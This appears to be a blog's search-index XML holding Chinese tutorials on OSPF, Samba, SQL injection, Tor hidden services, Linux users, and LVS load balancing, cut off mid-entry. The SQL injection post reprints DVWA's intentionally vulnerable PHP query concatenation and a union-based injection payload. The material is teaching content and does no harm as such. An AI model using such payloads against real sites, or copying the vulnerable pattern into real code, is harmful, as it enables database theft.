<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ospf协议</title>
    <link href="/2022/10/18/ospf%E8%AF%A6%E8%A7%A3/"/>
    <url>/2022/10/18/ospf%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="OSPF协议"><a href="#OSPF协议" class="headerlink" title="OSPF协议"></a>OSPF协议</h1><h3 id="1-什么是OSPF"><a href="#1-什么是OSPF" class="headerlink" title="1.什么是OSPF?"></a>1.什么是OSPF?</h3><p>ospf(开放最短路径优先)是一种基于链路状态的路由协议,具有路由变化收敛快、无路由环路、支持变长子网掩码(VLSM)和汇总、层次区域划分等优点</p><p>ospf数据直接封装在ip数据报中,属于网络层协议,协议号为89</p><p>ospf使用多播地址进行通信,ip地址为224.0.0.5和224.0.0.6,224.0.0.5为非dr&#x2F;bdr路由器监听的地址,224.0.0.6为dr&#x2F;bdr监听的地址</p><h3 id="2-OSPF在不同的网络中使用的通信地址"><a href="#2-OSPF在不同的网络中使用的通信地址" class="headerlink" title="2.OSPF在不同的网络中使用的通信地址"></a>2.OSPF在不同的网络中使用的通信地址</h3><ul><li><p><strong>点到点网络</strong>:<br>是连接单独的一对路由器的网络,点到点网络上的有效邻居总是可以形成邻接关系的,在这种网络上,ospf包使用的目标地址是224.0.0.5。</p></li><li><p><strong>广播型网络</strong>:</p><p>在广播行网络中(比如以太网),这样的网络会推举一个DR(指定路由器)和BDR(备份指定路由器),DR&#x2F;BDR的发送的OSPF包的目标地址为224.0.0.5;而除了DR&#x2F;BDR以外的OSPF包的目标地址为224.0.0.6</p><p>在广播型网络中,所有的路由器都使用224.0.0.5的ip地址发送hello包,用来维持邻居关系,非DR&#x2F;BDR路由都以224.0.0.6的地址发送lsa更新,而只有DR&#x2F;BDR路由监听这个地址,反过来,DR路由使用224.0.0.5来发送更新到非DR路由</p></li></ul><h3 id="3-OSPF协议报文类型"><a href="#3-OSPF协议报文类型" class="headerlink" title="3.OSPF协议报文类型"></a>3.OSPF协议报文类型</h3><ul><li><p>Hello 报文(Hello Packet)<br>最常用的一种报文，周期性的发送给本路由器的邻居。内容包括一些定时器的数值、DR、BDR（Backup Designated Router）以及自己已知的邻居。</p></li><li><p>DD 报文(Database Description Packet)</p><p>两台路由器进行数据同步时,用DD报文来描述自己的LSDB(Link State DataBase),内容包括每一条LSA的摘要(摘要是指LSA的HEAD，通过该HEAD可以唯一标识一条LSA) </p></li><li><p>LSR报文(Link State Request Packet)</p><p>两台路由器互相交换过DD报文之后，知道对端的路由器有哪些LSA是本地的LSDB 所缺少的，这时需要发送LSR报文向对方请求所需的LSA。内容包括所需要的LSA的摘要</p></li><li><p>LSU报文(Link State Update Packet)</p><p>用来向对端路由器发送所需要的LSA，内容是多条LSA（全部内容）的集合。</p></li><li><p>LSACK报文(Link State Acknowledgement Packet)</p><p>用来对接收到的LSU报文进行确认。内容是需要确认的LSA的HEAD（一个报文可对多个LSA 进行确认）。</p></li></ul><p></p><h3 id="4-运行OSPF路由协议的路由器类型"><a href="#4-运行OSPF路由协议的路由器类型" class="headerlink" title="4.运行OSPF路由协议的路由器类型"></a>4.运行OSPF路由协议的路由器类型</h3><ul><li><p><strong>1.IR(Internal Router)</strong></p><p>区域内部的路由器</p></li><li><p><strong>2.BR(Borded Router)</strong></p><p>骨干区域路由器</p></li><li><p><strong>3.ABR(Area Borded Router)</strong></p><p>区域边界路由器</p></li><li><p><strong>4.ASBR(AS Boundary Router)</strong></p><p>自治系统边界路由器</p></li></ul><h3 id="5-OSPF的相关概念"><a href="#5-OSPF的相关概念" class="headerlink" title="5.OSPF的相关概念"></a>5.OSPF的相关概念</h3><ul><li><p><strong>1.区域</strong></p><p>OSPF属于自治系统内部的路由协议,一般如果自治系统包含的路由器数量过多,一般会采用分层结构,将整个自治系统分为多个区域,区域之间通过一个骨干区域互联，每个非骨干区域都需要直接与骨干区域连接。</p></li><li><p><strong>2.路由器ID号</strong></p><p>一台路由器如果要运行OSPF协议，必须存在Router ID。如果没有配置ID号，系统会从当前接口的IP 地址中自动选一个作为路由器的ID号。</p></li><li><p><strong>3.路由聚合</strong></p><p>AS被划分成不同的区域，每一个区域通过OSPF边界路由器（ABR）相连，区域间可以通过路由汇聚来减少路由信息，减小路由表的规模，提高路由器的运算速度。</p></li><li><p><strong>4.路由类型</strong></p><ul><li><p>1.区域内路由</p></li><li><p>2.区域间路由</p></li><li><p>3.第一类外部路由</p></li><li><p>4.第二类外部路由</p></li></ul><p>区域内和区域间路由描述的是AS内部的网络结构，外部路由则描述了应该如何选择到AS以外目的地址的路由。</p><p>第一类外部路由是指接收的是IGP（Interior Gateway Protocol，内部网关协议）路由（例如静态路由和RIP路由）。由于这类路由的可信程度较高，并且和OSPF自身路由的开销具有可比性，所以到第一类外部路由的开销等于本路由器到相应的ASBR的开销与ASBR到该路由目的地址的开销之和。</p><p>第二类外部路由是指接收的是EGP（Exterior Gateway Protocol，外部网关协议）路由。由于这类路由的可信度比较低，所以OSPF协议认为从ASBR到自治系统之外的开销远远大于在自治系统之内到达ASBR的开销。所以计算路由开销时将主要考虑前者，即到第二类外部路由的开销等于ASBR到该路由目的地址的开销。如果计算出开销值相等的两条路由，再考虑本路由器到相应的ASBR的开销。</p></li></ul><p>参考:</p><p><a href="https://blog.51cto.com/kalng/829436">https://blog.51cto.com/kalng/829436</a></p><p><a href="https://cloud.tencent.com/developer/article/2021022">https://cloud.tencent.com/developer/article/2021022</a></p>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>samba服务配置</title>
    <link href="/2022/10/15/samba%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE/"/>
    <url>/2022/10/15/samba%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="1-samba服务配置"><a href="#1-samba服务配置" class="headerlink" title="1.samba服务配置"></a>1.samba服务配置</h2><p><em>环境基于debian11</em></p><ul><li>1.安装服务必要的组件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install samba<br></code></pre></td></tr></table></figure><ul><li><p>2.配置共享目录</p><p>&#x2F;etc&#x2F;samba&#x2F;smb.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[share]<br>comment = file share <span class="hljs-comment">#共享目录的描述信息</span><br>path = /srv/smbshare <span class="hljs-comment">#共享目录的路径</span><br>available = <span class="hljs-built_in">yes</span><br>browsable = <span class="hljs-built_in">yes</span><br>writable = <span class="hljs-built_in">yes</span>  <span class="hljs-comment"># 可写权限</span><br>valid <span class="hljs-built_in">users</span> = armbian <span class="hljs-comment"># 有效的访问用户</span><br><br></code></pre></td></tr></table></figure></li><li><p>3.添加samba用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo smbpasswd -a armbian <span class="hljs-comment">#这里添加的用户必须是系统已经存在的用户,这里设置的密码可以和系统用户的密码不一样</span><br><span class="hljs-comment">#用户在访问共享目录的时候权限除了取决于共享目录的配置权限还取决于系统用户对这个共享目录的访问权限</span><br></code></pre></td></tr></table></figure></li><li><p>4.启动samba服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl start smbd.service<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sql注入详解</title>
    <link href="/2022/10/06/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/10/06/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入详解"><a href="#sql注入详解" class="headerlink" title="sql注入详解"></a>sql注入详解</h1><h3 id="1-什么是sql注入"><a href="#1-什么是sql注入" class="headerlink" title="1.什么是sql注入?"></a>1.什么是sql注入?</h3><p>sql注入攻击是网站在处理用户请求的参数,在没有检验或者检验不严谨的情况下直接插入到sql语句中执行,导致用户可以构造恶意参数获取敏感数据。</p><h3 id="2-sql注入的工作原理"><a href="#2-sql注入的工作原理" class="headerlink" title="2.sql注入的工作原理"></a>2.sql注入的工作原理</h3><p>实例1</p><p>看下面的一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br><span class="hljs-comment">// Get input</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_DVWA</span>[<span class="hljs-string">&#x27;SQLI_DB&#x27;</span>]) &#123;<br><span class="hljs-keyword">case</span> MYSQL:<br><span class="hljs-comment">// Check database</span><br>            <span class="hljs-comment">#构造需要执行的sql语句</span><br><span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>            <span class="hljs-comment">#执行sql语句</span><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br><span class="hljs-comment">// Get results</span><br><span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;<br><span class="hljs-comment">// Get values</span><br>                <span class="hljs-comment">#构造返回结果</span><br><span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br><span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br><br><span class="hljs-comment">// Feedback for end user</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> SQLITE:<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$sqlite_db_connection</span>;<br><br><span class="hljs-comment">#$sqlite_db_connection = new SQLite3($_DVWA[&#x27;SQLITE_DB&#x27;]);</span><br><span class="hljs-comment">#$sqlite_db_connection-&gt;enableExceptions(true);</span><br><br><span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br><span class="hljs-comment">#print $query;</span><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-variable">$results</span> = <span class="hljs-variable">$sqlite_db_connection</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$query</span>);<br>&#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Caught exception: &#x27;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$results</span>) &#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$results</span>-&gt;<span class="hljs-title function_ invoke__">fetchArray</span>()) &#123;<br><span class="hljs-comment">// Get values</span><br><span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br><span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br><br><span class="hljs-comment">// Feedback for end user</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error in fetch &quot;</span>.<span class="hljs-variable">$sqlite_db</span>-&gt;<span class="hljs-title function_ invoke__">lastErrorMsg</span>();<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125; <br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在上述代码中我们可以发现参数id是由用户传递的,并且参数id并没有经过服务器的任何处理直接插入到sql语句中执行,由于id是由用户 传递的,因此id参数对于用户来说可控,因此用户可以通过构造参数id实现自己想执行的sql语句</p><p>比如如果用户输入1’ and 1&#x3D;2 union select version();–+</p><p>这个时候拼凑成要执行的sql语句就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,version();<span class="hljs-comment">--+&#x27;</span><br></code></pre></td></tr></table></figure><p>由于1&#x3D;2为假,因此这条sql语句执行的结果其实是我们构造的sql语句select 1, version()(一个mysql函数,返回数据库的版本信息)的执行结果,因此最终服务器会返回1,和数据库的版本信息。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tor的技术原理</title>
    <link href="/2022/09/04/Tor%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/"/>
    <url>/2022/09/04/Tor%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Tor的技术原理"><a href="#Tor的技术原理" class="headerlink" title="Tor的技术原理"></a>Tor的技术原理</h1><h3 id="1-Tor的历史"><a href="#1-Tor的历史" class="headerlink" title="1.Tor的历史"></a>1.Tor的历史</h3><p>1995年，美国海军研究实验室的科学家开始开发一套匿名系统，可以避免人们在互联网上的行迹被追 踪到。由于在该系统中，数据被层层密码保护，这个技术被称为叫作“洋葱路由”(tor)。</p><h3 id="2-Tor如何实现匿名访问"><a href="#2-Tor如何实现匿名访问" class="headerlink" title="2.Tor如何实现匿名访问?"></a>2.Tor如何实现匿名访问?</h3><p><strong>Tor客户端匿名原理</strong>:</p><p>Tor是一个三重代理,客户端在接入tor网络的时候,Tor客户端会首先连接tor目录服务器通信获得全球活动的中继节点,然后从中选取三个作为节点的相关信息(ip地址,公钥,出口策略,带宽,在线时间)组成电路(cirdcuit),这三个节点分别叫入口节点、中继节点、出口节点。用户的流量在发送到暗网服务器的时候会依次经过这三个节点,只有最后一个节点知道目标服务器,第一个节点知道自身的ip地址</p><pre><code class=" mermaid">graph LR;Client--&gt;GuardRelayGuardRelay--&gt;MiddleRelayMiddleRelay--&gt;ExitRelayExitRelay--&gt;RealServer</code></pre><p><strong>暗网服务器匿名原理</strong>:</p><p>服务器在接受客户端请求的时候,客户端并不是直接访问目标站点服务器,而是选取一个汇合节点进行通信,客户端和目标站点都是通过汇合节点进行数据请求的收发,而且服务器在和汇合节点通信的时候也是通过tor链路进行通信的。</p><p><strong>客户端访问暗网网站的过程</strong>:</p><ul><li>1.客户端通过tor链路和暗网的分布式散列表建立连接,开始查询目标网站的描述符,获得目标服务器的介绍节点</li><li>2.客户端随机选取一个节点作为汇合点(客户端和汇合点之间相隔两个节点),并生成一个一次性的cookie,并在汇合节点留下cookie将汇合点的ip地址和cookie加密(使用目标服务器的公钥)发送给介绍节点</li><li>3.服务器收到密文数据包后,用自己的私钥解密数据包,获得汇合点的ip地址,</li><li>4.服务器通过tor链路连接至汇合节点,并比对cookie,如果比对成功,客户端和目标站点建立通信</li></ul><p>至此客户端和目标站点中间隔了6个节点,分别是客户端入口节点、客户端中继节点、汇合点、服务器出口节点、服务器中继节点、服务器入口节点。</p><pre><code class=" mermaid">graph LR;Client--&gt;ClientGuardRelayClientGuardRelay--&gt;ClientMiddleRelay;ClientMiddleRelay--&gt;ClientExitRelay;Server--&gt;ServerGuardRelayServerGuardRelay--&gt;ServerMiddleRelay;ServerMiddleRelay--&gt;ServerExitRelay</code></pre><p><strong>Tor数据包加密过程</strong></p><p>首先客户端会选取三个作为节点作为通信的中继节点,并开始和这三个节点开始协商密钥对,每次发送数据时依次使用ExitNode的公钥,MiddleNode的公钥,GuardRelay的公钥对数据包进行加密。</p><h3 id="3-如何搭建一个暗网网站"><a href="#3-如何搭建一个暗网网站" class="headerlink" title="3.如何搭建一个暗网网站?"></a>3.如何搭建一个暗网网站?</h3><p>安装tor</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install tor<br></code></pre></td></tr></table></figure><p>编辑tor配置文件&#x2F;etc&#x2F;tor&#x2F;torrc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">HiddenServiceDir /var/lib/tor/hidden_service/<br>HiddenServicePort 80 127.0.0.1:10000 <span class="hljs-comment">#表示对外映射一个虚拟端口80提供服务,并将本地10000端口映射到80端口</span><br>Socks5Proxy 127.0.0.0:1080 <span class="hljs-comment">#使用前置代理,用代理连接至tor网络</span><br>HiddenServiceNumInstrductionPoints 10 <span class="hljs-comment">#最大数量的介绍节点</span><br>HiddenServiceVersion 3<span class="hljs-comment">#使用第三代洋葱地址</span><br>SOCKSPolicy accept 0.0.0.0 <span class="hljs-comment">#控制访问的客户端的ip地址段</span><br></code></pre></td></tr></table></figure><p>启动tor服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl start tor.service<br></code></pre></td></tr></table></figure><p>启动后目录&#x2F;var&#x2F;lib&#x2F;tor&#x2F;hidden_service下会生成两个文件hostname和private_key,分别是暗网的主机名和私钥,公钥就是暗网主机名</p><p>参考:</p><p><a href="https://2047.one/t/9204">https://2047.one/t/9204</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux用户权限管理</title>
    <link href="/2022/09/01/linux%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/"/>
    <url>/2022/09/01/linux%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="linux用户权限管理"><a href="#linux用户权限管理" class="headerlink" title="linux用户权限管理"></a>linux用户权限管理</h1><h3 id="1-用户分类"><a href="#1-用户分类" class="headerlink" title="1.用户分类"></a>1.用户分类</h3><p>linux中有三种用户</p><ul><li><p>root用户</p><p>uid为0,用户权限不受任何限制</p></li><li><p>系统用户</p><p>uid为1-999,方便系统进程的权限控制,系统用户不能登录系统。</p></li><li><p>普通用户</p><p>uid为1000-6000,具有系统有限的权限。</p></li></ul><h3 id="2-用户管理"><a href="#2-用户管理" class="headerlink" title="2.用户管理"></a>2.用户管理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#添加用户</span><br>useradd -s /bin/bash -m<br>-m <span class="hljs-comment">#创建家目录</span><br>-d /home/newuser <span class="hljs-comment">#指定用户的家目录</span><br>-M <span class="hljs-comment">#不创建家目录</span><br>-s /bin/bash <span class="hljs-comment">#指定用户的shell</span><br><br><span class="hljs-comment">#修改用户</span><br>usermod <br>-G <span class="hljs-comment">#修改用户的组</span><br>-a <span class="hljs-comment">#追加(和-G参数一起使用)</span><br><span class="hljs-comment">#删除用户</span><br>userdel<br>-r <span class="hljs-comment">#同时删除用户的家目录</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>负载均衡解决方案</title>
    <link href="/2022/08/23/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <url>/2022/08/23/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<h1 id="负载均衡解决方案"><a href="#负载均衡解决方案" class="headerlink" title="负载均衡解决方案"></a>负载均衡解决方案</h1><p>常用的负载均衡解决方案有一下几种</p><ul><li>1.LVS</li><li>2.Haproxy</li><li>3.Nginx</li></ul><h3 id="1-LVS"><a href="#1-LVS" class="headerlink" title="1.LVS"></a>1.LVS</h3><p>LVS(Linux Virtual Server),Linux虚拟服务器,是一个虚拟的服务器集群系统,常用于服务器负载均衡(基于四层的端口转发),lvs基于linux netfilter模块,因此效率十分高效。</p><h4 id="1-1-LVS主要组成部分"><a href="#1-1-LVS主要组成部分" class="headerlink" title="1.1.LVS主要组成部分:"></a>1.1.LVS主要组成部分:</h4><ul><li>1.负载均衡器</li><li>2.服务器池</li><li>3.共享存储</li></ul><h4 id="1-2-LVS负载均衡方式"><a href="#1-2-LVS负载均衡方式" class="headerlink" title="1.2.LVS负载均衡方式"></a>1.2.LVS负载均衡方式</h4><p>**VS&#x2F;NAT(网络地址转换模式) **</p><p>前提条件:</p><p>实际的服务器的网关要指向负载均衡器。</p><p>请求响应过程:</p><p>负载均衡器绑定一个虚拟的ip地址,客户端访问虚拟ip地址后,负载均衡器将请求的目标地址进行目标地址转换(DNAT),将请求分发给实际的服务器,服务器对请求进行响应后,由于负载均衡器是实际服务器的网关,这时,负载均衡器对响应包进行源地址转换(SNAT)。</p><p><strong>VS&#x2F;DR(直接路由模式)</strong></p><p>前提条件:</p><p>负载均衡器和实际的服务器要绑定同一个虚拟ip,并且要在同一个内部网络下。</p><p>请求响应过程:</p><p>客户端访问访问虚拟ip,负载均衡器收到请求,将请求的mac地址修改实际服务器的mac地址,导致请求发送给实际的服务器,由于负载均衡器和实际的服务器绑定了同一个虚拟ip地址,实际的服务器可以直接对客户端进行响应。</p><p><strong>VS&#x2F;TUN(隧道模式)</strong></p><p>前提条件:</p><p>调度器和实际的服务器都要绑定同一个虚拟ip地址,并且调度器和后端服务器要支持隧道技术,调度器和后端服务器可以在任意网络环境下。</p><p>请求响应过程:</p><p>负载均衡器接受到了客户端的请求后将原始的请求包加上一层ip头,以自己的ip地址为源ip地址,目标地址为实际的服务器节点ip地址,发送给目标服务器,目标服务器收到报文后,拆开第一个ip包头,发现里面的ip包头的目标ip为vip,由于实际的服务器都绑定了vip,因此他会处理这个请求报文。</p><h4 id="1-3-LVS负载均衡算法"><a href="#1-3-LVS负载均衡算法" class="headerlink" title="1.3.LVS负载均衡算法"></a>1.3.LVS负载均衡算法</h4><p><strong>1.RoundRobin(轮询调度)</strong></p><p>以轮流的方式选择实际的服务器节点</p><p><strong>2.Weitht RoundRobin(加权轮询调度)</strong></p><p>权重高的服务器节点更容易接受到请求,权重少的服务器接受更少的连接请求</p><p><strong>3.Least Connections(最小连接调度)</strong></p><p>将请求分发给实际连接数最少的服务器节点,服务器节点当接受到一个新的请求,则连接数+1,如果断开一个链接则连接数-1,一般用于长连接服务请求调度</p><p><strong>4.Weight Least Connections(加权最小连接调度)</strong></p><p>连接请求的分配和服务器节点的连接数和权重成正比,可以使得服务器在接受请求时,当前服务器的接收请求数和其权值成正比</p><p><strong>5.Locality-Based Least Connections(基于局部性的最少链接)</strong></p><p>针对请求报文的ip地址负载均衡调度,主要用于cache集群系统,目标是在服务器负载基本平衡的前提下,将相同目标ip地址的请求调度到同一台服务器,如果请求的服务器过载,</p><p><strong>6.Locality-Based Least Connections with Replication( 带复制的基于局部性最少链接)</strong></p><p>“带复制的基于局部性最少链接”调度算法也是针对目标IP地址的负载均衡，目前主要用于Cache集群系统。它与LBLC算法的不同之处是它要维护从一个目标IP地址到一组服务器的映射，而LBLC算法维护从一个目标IP地址到一台服务器的映射。该算法根据请求的目标IP地址找出该目标IP地址对应的服务器组，按”最小连接”原则从服务器组中选出一台服务器，若服务器没有超载，将请求发送到该服务器，若服务器超载；则按”最小连接”原则从这个集群中选出一台服务器，将该服务器加入到服务器组中，将请求发送到该服务器。同时，当该服务器组有一段时间没有被修改，将最忙的服务器从服务器组中删除，以降低复制的程度</p><p><strong>7.Destination Hashing(目标地址散列)</strong></p><p>“目标地址散列”调度算法根据请求的目标IP地址，作为散列键（Hash Key）从静态分配的散列表找出对应的服务器，若该服务器是可用的且未超载，将请求发送到该服务器，否则返回空。</p><p><strong>8.Source Hashing(源地址散列)</strong></p><p>“源地址散列”调度算法根据请求的源IP地址，作为散列键（Hash Key）从静态分配的散列表找出对应的服务器，若该服务器是可用的且未超载，将请求发送到该服务器，否则返回空。</p><h4 id="1-4-Keepalived"><a href="#1-4-Keepalived" class="headerlink" title="1.4.Keepalived"></a>1.4.Keepalived</h4><p>keepalived是为lvs服务的,用来自动配置lvs集群</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装keepalived组件</span><br>yum install -y keepalived<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 